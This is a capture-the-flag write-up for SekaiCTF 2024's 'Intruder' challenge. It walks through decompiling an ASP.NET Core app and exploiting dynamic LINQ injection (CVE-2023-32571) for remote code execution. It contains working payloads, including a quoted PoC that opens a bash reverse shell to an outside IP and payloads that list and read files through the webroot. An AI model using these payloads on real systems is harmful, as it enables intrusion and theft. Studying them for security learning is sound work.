# Intruder

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Solved by: @siunam
- Contributor: @colonneil
- 89 solves / 100 points
- Author: @Marc
- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

I just made a book library website! Let me know what you think of it!

Note: Due to security issue, you can't add a book now. Please come by later!

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826154421.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826154557.png)

In here, we can see that this web application was built with [ASP.NET Core](https://dotnet.microsoft.com/en-us/apps/aspnet).

In the "Books" drop-down menu, we can either view different books or add book:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826154658.png)

Let's try to add a book:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826154839.png)

However, when we clicked the "Add" button, nothing happens. In the challenge's description, it says "Due to security issue, you can't add a book now. Please come by later!". Hmm... Maybe we can't add new book.

How about view books?

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826155014.png)

In here, we can view the details the book:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826155635.png)

And search a book's title:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826155700.png)

Hmm... Usually, this kind of search is via a SQL query. Let's test for SQL injection:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826155828.png)

Huh, it error'ed when we inject a double quote (`"`) character. Let's try fixing the SQL error by add a SQL comment syntax, such as `--`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826155949.png)

Same error. Interesting.

To figure out why it errors when we inject a double quote character, we can read this web application source code.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/Web/Intruder/dist.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2024/Web/Intruder)-[2024.08.26|16:01:19(HKT)]
└> file dist.zip 
dist.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2024/Web/Intruder)-[2024.08.26|16:01:20(HKT)]
└> unzip dist.zip 
Archive:  dist.zip
  inflating: Dockerfile              
  inflating: docker-compose.yml      
  inflating: flag.txt                
  inflating: proxy.conf              
   creating: src/
  inflating: src/CRUD                
  inflating: src/CRUD.deps.json      
  inflating: src/CRUD.dll            
  inflating: src/CRUD.pdb            
  inflating: src/CRUD.runtimeconfig.json  
  inflating: src/Microsoft.AspNetCore.Antiforgery.dll  
  inflating: src/Microsoft.AspNetCore.Authentication.Abstractions.dll  
  inflating: src/Microsoft.AspNetCore.Authentication.Cookies.dll  
  [...]
   creating: src/wwwroot/
  inflating: src/wwwroot/CRUD.styles.css  
   creating: src/wwwroot/css/
  inflating: src/wwwroot/css/site.css  
  inflating: src/wwwroot/favicon.ico  
   creating: src/wwwroot/img/
  [...]
```

In ASP.NET Core web application, we usually need to **reverse engineer the compiled DLLs (Dynamic Link Library)**. But which DLL file we should investigate?

In `Dockerfile`, the entry point is this bash command:

```bash
ENTRYPOINT ["dotnet", "CRUD.dll"]
```

As you can see, it uses `dotnet` command to run `CRUD.dll`. Let's reverse engineer that DLL!

To do so, we can use [dnSpy](https://github.com/dnSpy/dnSpy) or [iLSpy](https://github.com/icsharpcode/ILSpy). For me, I'll be using iLSpy.

If we load that DLL into the decompiler, we can see that this web application is using [Razor Pages](https://learn.microsoft.com/en-us/aspnet/core/razor-pages/?view=aspnetcore-8.0&tabs=visual-studio):

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826161106.png)

Now, let's find the book searching functionality! Eventually, we'll find it in class `BookController` method `Index`:

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Linq.Dynamic.Core;
using CRUD.Controllers;
using CRUD.Models;
using Microsoft.AspNetCore.Mvc;

public class BookController : Controller
{
    [...]
    private static List<Book> _books = new List<Book>
    {
        new Book
        {
            Id = 1,
            Title = "To Kill a Mockingbird",
            Author = "Harper Lee",
            ISBN = "9780061120084",
            Description = "A novel set in the American South during the 1930s, focusing on the Finch family and their experiences.",
            ReleaseDate = new DateTime(1960, 7, 11),
            Genre = "Fiction",
            PurchaseLink = "https://www.amazon.com/Kill-Mockingbird-Harper-Lee/dp/0446310786"
        },
        [...]
    };
    [...]
    public IActionResult Index(string searchString, int page = 1, int pageSize = 5)
    {
        try
        {
            IQueryable<Book> query = _books.AsQueryable();
            if (!string.IsNullOrEmpty(searchString))
            {
                query = query.Where("Title.Contains(\"" + searchString + "\")");
            }
            int totalItems = query.Count();
            int totalPages = (int)Math.Ceiling((double)totalItems / (double)pageSize);
            List<Book> books = query.Skip((page - 1) * pageSize).Take(pageSize).ToList();
            BookPaginationModel viewModel = new BookPaginationModel
            {
                Books = books,
                TotalPages = totalPages,
                CurrentPage = page
            };
            return View(viewModel);
        }
        catch (Exception)
        {
            base.TempData["Error"] = "Something wrong happened while searching!";
            return Redirect("/books");
        }
    }
}
```

**In this method, it directly concatenates our `searchString` GET parameter's value into `query.Where`:**
```csharp
public IActionResult Index(string searchString, int page = 1, int pageSize = 5)
{
    try
    {
        IQueryable<Book> query = _books.AsQueryable();
        if (!string.IsNullOrEmpty(searchString))
        {
            query = query.Where("Title.Contains(\"" + searchString + "\")");
        }
        [...]
    }
    catch (Exception)
    {
        base.TempData["Error"] = "Something wrong happened while searching!";
        return Redirect("/books");
    }
}
```

Hmm... No wonders why it errors when we inject a double quote character.

In iLSpy, if we hover our mouse to the `Where` method, we can see its definition.

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826161757.png)

Hmm... The `Where` method belongs to [**LINQ (Language Integrated Query)**](https://learn.microsoft.com/en-us/dotnet/csharp/linq/).

> Language-Integrated Query (LINQ) is the name for a set of technologies based on the integration of query capabilities directly into the C# language. Traditionally, queries against data are expressed as simple strings without type checking at compile time or IntelliSense support. Furthermore, you have to learn a different query language for each type of data source: SQL databases, XML documents, various Web services, and so on. With LINQ, a query is a first-class language construct, just like classes, methods, and events. - [https://learn.microsoft.com/en-us/dotnet/csharp/linq/](https://learn.microsoft.com/en-us/dotnet/csharp/linq/)

TL;DR: LINQ is like SQL query.

If we Google something like "LINQ vulnerability", we can see a [blog post](https://research.nccgroup.com/2023/06/13/dynamic-linq-injection-remote-code-execution-vulnerability-cve-2023-32571/) mentioned that **dynamic LINQ injection could result in RCE (Remote Code Execution)**. The vulnerability itself is assigned with a CVE ID "CVE-2023-32571".

In that blog post, LINQ version 1.0.7.10 to 1.2.25 is vulnerable to that vulnerability. Let's check the challenge's LINQ version is vulnerable or not.

> Note: You can read the details of this vulnerability in the blog post.

We can do this in the `src/CRUD.deps.json`:

```json
{
  "runtimeTarget": {
    "name": ".NETCoreApp,Version=v7.0/linux-x64",
    "signature": ""
  },
  "compilationOptions": {},
  "targets": {
    ".NETCoreApp,Version=v7.0": {},
    ".NETCoreApp,Version=v7.0/linux-x64": {
      "CRUD/1.0.0": {
        "dependencies": {
          "System.Linq.Dynamic.Core": "1.2.25",
          [...]
        },
        [...]
```

As you can see, the LINQ version is 1.2.25, which is vulnerable to dynamic LINQ injection RCE!

If we search for the PoC (Proof-of-Concept) of this CVE, we can find [this GitHub repository](https://github.com/Tris0n/CVE-2023-32571-POC). By looking at the PoC lab, we can see that [it has the exact same logic](https://github.com/Tris0n/CVE-2023-32571-POC/blob/main/DynamicLinqToRce/Controllers/ProductsController.cs#L24):

```csharp
[...]
public class ProductsController : ControllerBase
{
    [Route("products")]
    [HttpPost]
    public IActionResult Show([FromBody] ShowProducts showProducts)
    {
        [...]
        var query = products.AsQueryable();

        if(showProducts.name != null)
        {
            var response = query.Where($"Name.Contains(\"{showProducts.name}\")");
            return new JsonResult(new { Products = response.ToArray() });
        }
        [...]
    }
}
```

If we [unescape the JSON payload](https://gchq.github.io/CyberChef/#recipe=Unescape_string()&input=XCIpICYmIFwiXCIuR2V0VHlwZSgpLkFzc2VtYmx5LkRlZmluZWRUeXBlcy5XaGVyZShpdC5OYW1lID09IFwiQXBwRG9tYWluXCIpLkZpcnN0KCkuRGVjbGFyZWRNZXRob2RzLldoZXJlKGl0Lk5hbWUgPT0gXCJDcmVhdGVJbnN0YW5jZUFuZFVud3JhcFwiKS5GaXJzdCgpLkludm9rZShcIlwiLkdldFR5cGUoKS5Bc3NlbWJseS5EZWZpbmVkVHlwZXMuV2hlcmUoaXQuTmFtZSA9PSBcIkFwcERvbWFpblwiKS5GaXJzdCgpLkRlY2xhcmVkUHJvcGVydGllcy5XaGVyZShpdC5uYW1lID09IFwiQ3VycmVudERvbWFpblwiKS5GaXJzdCgpLkdldFZhbHVlKG51bGwpLCBcIlN5c3RlbSwgVmVyc2lvbiA9IDQuMC4wLjAsIEN1bHR1cmUgPSBuZXV0cmFsLCBQdWJsaWNLZXlUb2tlbiA9IGI3N2E1YzU2MTkzNGUwODk7IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzXCIuU3BsaXQoXCI7XCIuVG9DaGFyQXJyYXkoKSkpLkdldFR5cGUoKS5Bc3NlbWJseS5EZWZpbmVkVHlwZXMuV2hlcmUoaXQuTmFtZSA9PSBcIlByb2Nlc3NcIikuRmlyc3QoKS5EZWNsYXJlZE1ldGhvZHMuV2hlcmUoaXQubmFtZSA9PSBcIlN0YXJ0XCIpLlRha2UoMykuTGFzdCgpLkludm9rZShudWxsLCBcIi9iaW4vYmFzaDstYyBcXFwiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xNzIuMTcuMC4xLzgwMDEgMD4mMVxcXCJcIi5TcGxpdChcIjtcIi5Ub0NoYXJBcnJheSgpKSkuR2V0VHlwZSgpLlRvU3RyaW5nKCkgPT0gKFwiIn0nIGh0dHA6Ly9sb2NhbGhvc3Q6ODAwMC9hcGkvcHJvZHVjdHM), we'll get this:

```csharp
") && "".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredMethods.Where(it.Name == "CreateInstanceAndUnwrap").First().Invoke("".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredProperties.Where(it.name == "CurrentDomain").First().GetValue(null), "System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089; System.Diagnostics.Process".Split(";".ToCharArray())).GetType().Assembly.DefinedTypes.Where(it.Name == "Process").First().DeclaredMethods.Where(it.name == "Start").Take(3).Last().Invoke(null, "/bin/bash;-c \"bash -i >& /dev/tcp/172.17.0.1/8001 0>&1\"".Split(";".ToCharArray())).GetType().ToString() == (""}' http://localhost:8000/api/products
```

## Exploitation

Armed with the above information, we can get the flag via:
1. Exfiltrate the flag's filename
2. Read and exfiltrate the flag's file content

To do so, we can output the result to the webroot directory, which is at `/app/src/wwwroot/`.

- Exfiltrate the flag's filename

```csharp
") && "".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredMethods.Where(it.Name == "CreateInstanceAndUnwrap").First().Invoke("".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredProperties.Where(it.name == "CurrentDomain").First().GetValue(null), "System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089; System.Diagnostics.Process".Split(";".ToCharArray())).GetType().Assembly.DefinedTypes.Where(it.Name == "Process").First().DeclaredMethods.Where(it.name == "Start").Take(3).Last().Invoke(null, "/bin/bash;-c \"ls / > /app/src/wwwroot/output.txt\"".Split(";".ToCharArray())).GetType().ToString() == ("
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/SekaiCTF-2024/images/Pasted%20image%2020240826163858.png)

```shell
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2024/Web/Intruder/src)-[2024.08.26|16:38:39(HKT)]
└> curl https://intruder.chals.sekai.team/output.txt
[...]
flag_08bd7291-c12a-4b99-a470-25851098f290.txt
[...]
```

- Read and exfiltrate the flag's file content

```csharp
") && "".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredMethods.Where(it.Name == "CreateInstanceAndUnwrap").First().Invoke("".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredProperties.Where(it.name == "CurrentDomain").First().GetValue(null), "System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089; System.Diagnostics.Process".Split(";".ToCharArray())).GetType().Assembly.DefinedTypes.Where(it.Name == "Process").First().DeclaredMethods.Where(it.name == "Start").Take(3).Last().Invoke(null, "/bin/bash;-c \"cat /flag_08bd7291-c12a-4b99-a470-25851098f290.txt > /app/src/wwwroot/output.txt\"".Split(";".ToCharArray())).GetType().ToString() == ("
```

```shell
┌[siunam♥Mercury]-(~/ctf/SekaiCTF-2024/Web/Intruder/src)-[2024.08.26|16:38:45(HKT)]
└> curl https://intruder.chals.sekai.team/output.txt
SEKAI{L1nQ_Inj3cTshio0000nnnnn}
```

- **Flag: `SEKAI{L1nQ_Inj3cTshio0000nnnnn}`**

## Conclusion

What we've learned:

1. ASP.NET Core dynamic LINQ injection to RCE (CVE-2023-32571)